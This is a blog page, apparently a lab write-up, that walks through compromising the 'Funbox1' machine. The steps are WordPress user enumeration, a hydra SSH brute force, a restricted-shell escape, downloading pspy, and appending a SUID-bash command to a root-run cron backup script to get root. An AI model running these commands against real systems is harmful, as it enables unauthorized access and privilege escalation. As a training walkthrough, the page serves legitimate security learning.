@@ -1,0 +1,1237 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Reverse Shell,Brute-Force,Script," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="This machine is exploited by mounting a login brute-force attack against the SSH service using a username recovered during the enumeration of a Wordpress website. It is escalated via insecure file per">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Funbox1">
+<meta property="og:url" content="https://sev1on.github.io/undefined/Funbox1/index.html">
+<meta property="og:site_name" content="Sev1on">
+<meta property="og:description" content="This machine is exploited by mounting a login brute-force attack against the SSH service using a username recovered during the enumeration of a Wordpress website. It is escalated via insecure file per">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-06-18T09:55:01.000Z">
+<meta property="article:modified_time" content="2021-08-01T08:00:15.935Z">
+<meta property="article:author" content=" ">
+<meta property="article:tag" content="Reverse Shell">
+<meta property="article:tag" content="Brute-Force">
+<meta property="article:tag" content="Script">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Sev1on'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://sev1on.github.io/undefined/Funbox1/"/>
+
+
+
+
+
+  <title>Funbox1 | Sev1on</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sev1on</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-fas fa-tag"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-fa-solid fa-align-center"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-far fa-user-circle"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://sev1on.github.io/undefined/Funbox1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/Sevion3.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sev1on">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Funbox1</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-06-18T09:55:01+00:00">
+                2021-06-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux-Walkthrough/" itemprop="url" rel="index">
+                    <span itemprop="name">Linux Walkthrough</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+              <div class="post-description">
+                  This machine is exploited by mounting a login brute-force attack against the SSH service using a username recovered during the enumeration of a Wordpress website. It is escalated via insecure file permissions on a backup bash script that runs on a schedule as root.
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Exploitation-Guide-for-Funbox"><a href="#Exploitation-Guide-for-Funbox" class="headerlink" title="Exploitation Guide for Funbox"></a><strong>Exploitation Guide for Funbox</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~# sudo nmap 192.168.120.189</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 22:10 EDT</span><br><span class="line">Nmap scan report for 192.168.120.189</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a><strong>FTP</strong></h3><p>We first check if we can access the FTP service without credentials.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~# ftp 192.168.120.189</span><br><span class="line">Connected to 192.168.120.189.</span><br><span class="line">220 ProFTPD Server (Debian) [::ffff:192.168.120.189]</span><br><span class="line">Name (192.168.120.189:kali): anonymous</span><br><span class="line">331 Password required for anonymous</span><br><span class="line">Password:</span><br><span class="line">530 Login incorrect.</span><br><span class="line">Login failed.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>However, we are unlucky and so we will leave this one for now.</p>
+<h3 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a><strong>Web Enumeration</strong></h3><p>Browsing to the website on port 80 we find it redirects to <a target="_blank" rel="noopener" href="http://funbox.fritz.box/">http://funbox.fritz.box/</a>. We can add a hosts file entry to get things working correctly for us.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~# sudo echo &quot;192.168.120.189 funbox.fritz.box&quot; &gt;&gt; /etc/hosts</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Now that we can access the website, we see that it is running WordPress. Our next step is to run <code>wpscan</code> to see if we can identify any vulnerabilities and any usernames.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://funbox.fritz.box/ --enumerate u</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.1</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http://funbox.fritz.box/ [192.168.120.189]</span><br><span class="line">[+] Started: Thu Aug 20 22:26:14 2020</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://funbox.fritz.box/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] joe</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span><br><span class="line"></span><br><span class="line">[+] Finished: Thu Aug 20 22:26:24 2020</span><br><span class="line">[+] Requests Done: 26</span><br><span class="line">[+] Cached Requests: 36</span><br><span class="line">[+] Data Sent: 6.525 KB</span><br><span class="line">[+] Data Received: 257.882 KB</span><br><span class="line">[+] Memory used: 150.535 MB</span><br><span class="line">[+] Elapsed time: 00:00:09</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>We can see <code>wpscan</code> identified two users, <code>joe</code> and <code>admin</code>. With this knowledge we can continue by next looking at the SSH service.</p>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="SSH-Brute-Force"><a href="#SSH-Brute-Force" class="headerlink" title="SSH Brute Force"></a><strong>SSH Brute Force</strong></h3><p>Since we now have a potential username, <code>joe</code>, we can attempt to brute force the password using <code>hydra</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~# hydra -l joe -P /usr/share/wordlists/rockyou.txt ssh://192.168.120.189</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-20 22:33:11</span><br><span class="line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.120.189:22/</span><br><span class="line">[22][ssh] host: 192.168.120.189   login: joe   password: 12345</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">[WARNING] Writing restore file because 3 final worker threads did not complete until end.</span><br><span class="line">[ERROR] 3 targets did not resolve or could not be connected</span><br><span class="line">[ERROR] 0 targets did not complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-20 22:33:20</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>This quickly identifies the password <code>12345</code> and we can use these credentials to login via SSH.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh joe@192.168.120.189</span><br><span class="line">...</span><br><span class="line">joe@funbox:~$ id</span><br><span class="line">uid=1001(joe) gid=1001(joe) groups=1001(joe)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="Shell-Breakout"><a href="#Shell-Breakout" class="headerlink" title="Shell Breakout"></a><strong>Shell Breakout</strong></h3><p>If we try to change directory we find that we are in a restricted shell.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">joe@funbox:~$ cd /</span><br><span class="line">-rbash: cd: restricted</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Before we can continue our enumeration we will need to escape this and obtain a full shell. First we will check our environment to see what we have access to.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">joe@funbox:~$ env</span><br><span class="line">SHELL=/bin/rbash</span><br><span class="line">PWD=/home/joe</span><br><span class="line">LOGNAME=joe</span><br><span class="line">XDG_SESSION_TYPE=tty</span><br><span class="line">MOTD_SHOWN=pam</span><br><span class="line">HOME=/home/joe</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">...</span><br><span class="line">LESSOPEN=| /usr/bin/lesspipe %s</span><br><span class="line">USER=joe</span><br><span class="line">SHLVL=1</span><br><span class="line">XDG_SESSION_ID=28</span><br><span class="line">XDG_RUNTIME_DIR=/run/user/1001</span><br><span class="line">SSH_CLIENT=192.168.118.6 50000 22</span><br><span class="line">XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</span><br><span class="line">DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1001/bus</span><br><span class="line">SSH_TTY=/dev/pts/0</span><br><span class="line">_=/usr/bin/env</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Looking at the <code>PATH</code> variable it appears to be unchanged and as such we can just run <code>bash</code> normally to escape.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joe@funbox:~$ bashjoe@funbox:~$ cd /joe@funbox:/$</span><br></pre></td></tr></table></figure>
+
+<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><h3 id="Insecure-File-Permissions"><a href="#Insecure-File-Permissions" class="headerlink" title="Insecure File Permissions"></a><strong>Insecure File Permissions</strong></h3><p>If we return to <code>joe&#39;s</code> home directory we can find a file called <code>mbox</code> containing some interesting information.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joe@funbox:/$ cd ~joe@funbox:~$ cat mboxFrom root@funbox  Fri Jun 19 13:12:38 2020Return-Path: &lt;root@funbox&gt;X-Original-To: joe@funboxDelivered-To: joe@funboxReceived: by funbox.fritz.box (Postfix, from userid 0)        id 2D257446B0; Fri, 19 Jun 2020 13:12:38 +0000 (UTC)Subject: BackupsTo: &lt;joe@funbox&gt;X-Mailer: mail (GNU Mailutils 3.7)Message-Id: &lt;20200619131238.2D257446B0@funbox.fritz.box&gt;Date: Fri, 19 Jun 2020 13:12:38 +0000 (UTC)From: root &lt;root@funbox&gt;Hi Joe, please tell funny the backupscript is done.From root@funbox  Fri Jun 19 13:15:21 2020Return-Path: &lt;root@funbox&gt;X-Original-To: joe@funboxDelivered-To: joe@funboxReceived: by funbox.fritz.box (Postfix, from userid 0)        id 8E2D4446B0; Fri, 19 Jun 2020 13:15:21 +0000 (UTC)Subject: BackupsTo: &lt;joe@funbox&gt;X-Mailer: mail (GNU Mailutils 3.7)Message-Id: &lt;20200619131521.8E2D4446B0@funbox.fritz.box&gt;Date: Fri, 19 Jun 2020 13:15:21 +0000 (UTC)From: root &lt;root@funbox&gt;Joe, WTF!?!?!?!?!?! Change your password right now! 12345 is an recommendation to fire you.</span><br></pre></td></tr></table></figure>
+
+<p>It appears that a user called <code>funny</code> is waiting on a backup script. If we change to <code>funny&#39;s</code> home directory we can find the script with some insecure file permissions.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joe@funbox:/home/funny$ ls -lahtotal 47Mdrwxr-xr-x 3 funny funny 4.0K Jul 18 10:02 .drwxr-xr-x 4 root  root  4.0K Jun 19 11:50 ..-rwxrwxrwx 1 funny funny   55 Jul 18 10:15 .backup.sh-rw------- 1 funny funny    0 Aug 14 13:03 .bash_history-rw-r--r-- 1 funny funny  220 Feb 25 12:03 .bash_logout-rw-r--r-- 1 funny funny 3.7K Feb 25 12:03 .bashrcdrwx------ 2 funny funny 4.0K Jun 19 10:43 .cache-rw-rw-r-- 1 funny funny  47M Aug 21 06:58 html.tar-rw-r--r-- 1 funny funny  807 Feb 25 12:03 .profile-rw-rw-r-- 1 funny funny  162 Jun 19 14:13 .reminder.sh-rw-rw-r-- 1 funny funny   74 Jun 19 12:25 .selected_editor-rw-r--r-- 1 funny funny    0 Jun 19 10:44 .sudo_as_admin_successful-rw------- 1 funny funny 7.7K Jul 18 10:02 .viminfojoe@funbox:/home/funny$ cat .backup.sh#!/bin/bashtar -cf /home/funny/html.tar /var/www/html</span><br></pre></td></tr></table></figure>
+
+<p>Before we overwrite the file, let’s first check whether or not it is being executed and who by. To do this we will use <a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">pspy</a>. <code>pspy</code> is tool which allows you to snoop on processes without needing <code>root</code> permissions. We can download <code>pspy</code> to <code>/tmp</code> and run it for several minutes to see if anything interesting is revealed.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joe@funbox:/tmp$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64...2020-08-21 07:05:12 (24.4 MB/s) - ‘pspy64’ saved [3078592/3078592]joe@funbox:/tmp$ chmod +x pspy64joe@funbox:/tmp$ ./pspy64pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855     ██▓███    ██████  ██▓███ ▓██   ██▓    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░    ░░       ░  ░  ░  ░░       ▒ ▒ ░░                   ░           ░ ░                               ░ ░Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)Draining file system events due to startup...done2020/08/21 07:05:32 CMD: UID=0    PID=978    | proftpd: (accepting connections)2020/08/21 07:05:32 CMD: UID=112  PID=951    | /usr/sbin/mysqld2020/08/21 07:05:32 CMD: UID=0    PID=943    | /usr/lib/policykit-1/polkitd --no-debug2020/08/21 07:05:32 CMD: UID=0    PID=924    | /bin/login -p --...2020/08/21 07:05:32 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity2020/08/21 07:06:01 CMD: UID=0    PID=13193  | /usr/sbin/CRON -f2020/08/21 07:06:01 CMD: UID=1000 PID=13194  | /bin/sh -c /home/funny/.backup.sh2020/08/21 07:06:01 CMD: UID=1000 PID=13195  | /bin/bash /home/funny/.backup.sh2020/08/21 07:06:01 CMD: UID=1000 PID=13196  | tar -cf /home/funny/html.tar /var/www/html2020/08/21 07:06:01 CMD: UID=1000 PID=13198  | /usr/sbin/postdrop -r2020/08/21 07:06:01 CMD: UID=1000 PID=13197  | /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem funny...2020/08/21 07:10:01 CMD: UID=0    PID=13405  | /bin/sh -c /home/funny/.backup.sh2020/08/21 07:10:01 CMD: UID=1000 PID=13404  | tar -cf /home/funny/html.tar /var/www/html2020/08/21 07:10:01 CMD: UID=0    PID=13403  | /bin/sh -c /home/funny/.backup.sh2020/08/21 07:10:01 CMD: UID=1000 PID=13402  | /bin/bash /home/funny/.backup.sh2020/08/21 07:10:01 CMD: UID=1000 PID=13401  | /bin/sh -c /home/funny/.backup.sh2020/08/21 07:10:01 CMD: UID=0    PID=13400  | /usr/sbin/CRON -f2020/08/21 07:10:01 CMD: UID=0    PID=13399  | /usr/sbin/CRON -f2020/08/21 07:10:01 CMD: UID=0    PID=13406  | tar -cf /home/funny/html.tar /var/www/html2020/08/21 07:10:02 CMD: UID=0    PID=13407  | /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem root2020/08/21 07:10:02 CMD: UID=1000 PID=13410  | /usr/sbin/postdrop -r2020/08/21 07:10:02 CMD: UID=0    PID=13409  | /usr/sbin/postdrop -r2020/08/21 07:10:02 CMD: UID=1000 PID=13408  | /usr/sbin/sendmail -FCronDaemon -i -B8BITMIME -oem funny2020/08/21 07:10:02 CMD: UID=0    PID=13411  | cleanup -z -t unix -u -c2020/08/21 07:10:02 CMD: UID=0    PID=13412  | trivial-rewrite -n rewrite -t unix -u -c2020/08/21 07:10:02 CMD: UID=0    PID=13413  | local -t unix2020/08/21 07:10:02 CMD: UID=0    PID=13414  | local -t unix</span><br></pre></td></tr></table></figure>
+
+<p>Although we do initially see that <code>/home/funny/.backup.sh</code> is run as <code>funny</code>, we later see that it is also run as <code>root</code>. So to exploit this all we need to do is append a malicious command to <code>/home/funny/.backup.sh</code>. We can do this as follows.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joe@funbox:~$ echo &quot;cp -f /bin/bash /tmp/bash &amp;&amp; chmod u+s /tmp/bash&quot; &gt;&gt; /home/funny/.backup.shjoe@funbox:~$ cat /home/funny/.backup.sh#!/bin/bashtar -cf /home/funny/html.tar /var/www/htmlcp -f /bin/bash /tmp/bash &amp;&amp; chmod u+s /tmp/bash</span><br></pre></td></tr></table></figure>
+
+<p>Now we wait five to ten minutes for our command to execute and then we should find a copy of <code>bash</code> in the <code>/tmp</code> directory with its SUID bit set. We can then execute this to obtain a root shell.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joe@funbox:~$ ls -lah /tmptotal 4.2Mdrwxrwxrwt 13 root root  4.0K Aug 21 07:18 .drwxr-xr-x 20 root root  4.0K Aug 14 12:40 ..-rwsr-xr-x  1 root funny 1.2M Aug 21 07:35 bashdrwxrwxrwt  2 root root  4.0K Aug 21 02:07 .font-unixdrwxrwxrwt  2 root root  4.0K Aug 21 02:07 .ICE-unix-rwxrwxr-x  1 joe  joe   3.0M Aug 22  2019 pspy64drwx------  3 root root  4.0K Aug 21 02:07 snap.lxddrwx------  3 root root  4.0K Aug 21 02:07 systemd-private-743ec18eec5840e98c3875859e1eab06-apache2.service-sFj0Vedrwx------  3 root root  4.0K Aug 21 02:07 systemd-private-743ec18eec5840e98c3875859e1eab06-systemd-logind.service-H0gLpjdrwx------  3 root root  4.0K Aug 21 02:10 systemd-private-743ec18eec5840e98c3875859e1eab06-systemd-resolved.service-xyb48idrwx------  3 root root  4.0K Aug 21 02:07 systemd-private-743ec18eec5840e98c3875859e1eab06-systemd-timesyncd.service-SpPXfhdrwxrwxrwt  2 root root  4.0K Aug 21 02:07 .Test-unixdrwx------  2 root root  4.0K Aug 21 02:07 vmware-root_656-2689274927drwxrwxrwt  2 root root  4.0K Aug 21 02:07 .X11-unixdrwxrwxrwt  2 root root  4.0K Aug 21 02:07 .XIM-unixjoe@funbox:~$ /tmp/bash -pbash-5.0# iduid=1001(joe) gid=1001(joe) euid=0(root) groups=1001(joe)</span><br></pre></td></tr></table></figure>
+
+<p>Focus：</p>
+<p>修改.backup.sh的内容为：</p>
